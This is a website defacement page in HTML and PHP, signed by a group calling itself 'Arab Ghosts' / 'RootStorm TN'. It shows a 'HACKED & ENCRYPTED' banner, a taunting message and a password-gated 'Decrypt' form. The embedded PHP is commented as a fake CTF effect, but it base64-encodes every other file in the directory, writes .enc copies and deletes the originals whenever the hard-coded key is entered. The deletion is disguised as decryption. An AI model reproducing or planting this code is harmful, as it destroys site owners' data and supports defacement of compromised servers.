<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>HACKED BY ARAB GHOSTS TN</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap');

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: black;
      font-family: 'Orbitron', monospace;
      color: #00ff00;
      overflow: hidden;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .glitch-logo {
      width: 180px;
      height: 180px;
      border-radius: 50%;
      overflow: hidden;
      border: 4px solid red;
      margin-bottom: 20px;
      position: relative;
      animation: glitchLogo 1s infinite;
    }

    .glitch-logo img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      border-radius: 50%;
    }

    @keyframes glitchLogo {
      0% { transform: translate(0); }
      20% { transform: translate(-2px, 2px); }
      40% { transform: translate(2px, -2px); }
      60% { transform: translate(-1px, 1px); }
      80% { transform: translate(1px, -1px); }
      100% { transform: translate(0); }
    }

    h1 {
      font-size: 3em;
      text-shadow: 0 0 10px red, 0 0 20px red;
      animation: glow 1.5s infinite alternate;
    }

    @keyframes glow {
      from { text-shadow: 0 0 10px red; }
      to { text-shadow: 0 0 30px red; }
    }

    .decrypt-box {
      margin-top: 30px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    input[type="password"] {
      padding: 10px;
      font-size: 1em;
      background: #111;
      color: #0f0;
      border: 2px solid #0f0;
      outline: none;
      margin-bottom: 10px;
    }

    button {
      background: red;
      border: none;
      color: white;
      padding: 10px 20px;
      font-size: 1em;
      cursor: pointer;
      text-shadow: 0 0 5px black;
    }

    button:hover {
      background: #ff4444;
    }

    .decrypted-content {
      margin-top: 30px;
      color: #fff;
      display: none;
      text-align: center;
      font-size: 1.2em;
      padding: 15px;
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid #444;
      border-radius: 10px;
      width: 80%;
    }

    .signature {
      position: absolute;
      bottom: 20px;
      font-size: 1em;
      color: #888;
    }

    @keyframes flicker {
      0% { opacity: 1; }
      50% { opacity: 0.9; }
      80% { opacity: 0.8; }
      100% { opacity: 1; }
    }

    body::before {
      content: '';
      position: absolute;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      background: repeating-linear-gradient(
        0deg,
        rgba(255,0,0,0.05),
        rgba(255,0,0,0.05) 1px,
        transparent 1px,
        transparent 2px
      );
      pointer-events: none;
      animation: flicker 0.15s infinite;
      z-index: -1;
    }
  </style>
</head>
<body>

  <div class="glitch-logo">
    <img src="https://e.top4top.io/p_3390f8qxc0.jpg" alt="Hacker Logo" />
  </div>

  <h1>HACKED & ENCRYPTED</h1>

  <div class="decrypt-box">
    <form method="POST">
      <input type="password" name="decryptKey" placeholder="Enter Decryption Key">
      <button type="submit">Decrypt</button>
    </form>
  </div>

  <div class="decrypted-content" id="secretContent">
    <p>✔️ Files Decrypted Successfully.</p>
    <p>Message: You were lucky... Next time, we won’t be that kind.</p>
    <p>-  The Arab Ghosts -</p>
  </div>

  <div class="signature">© 2025 - RootStorm TN</div>

  <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
      $key = $_POST['decryptKey'];
      $realKey = 'rootstorm';
      if ($key === $realKey) {
        echo "<script>document.getElementById('secretContent').style.display = 'block';</script>";

        // Simulate auto-encryption trigger (Fake CTF effect)
        $files = glob("*.*");
        foreach ($files as $file) {
          if ($file !== basename(__FILE__)) {
            $content = base64_encode(file_get_contents($file));
            file_put_contents($file . ".enc", $content);
            unlink($file);
          }
        }
      } else {
        echo "<script>alert('Wrong Decryption Key!');</script>";
      }
    }
  ?>

</body>
</html>
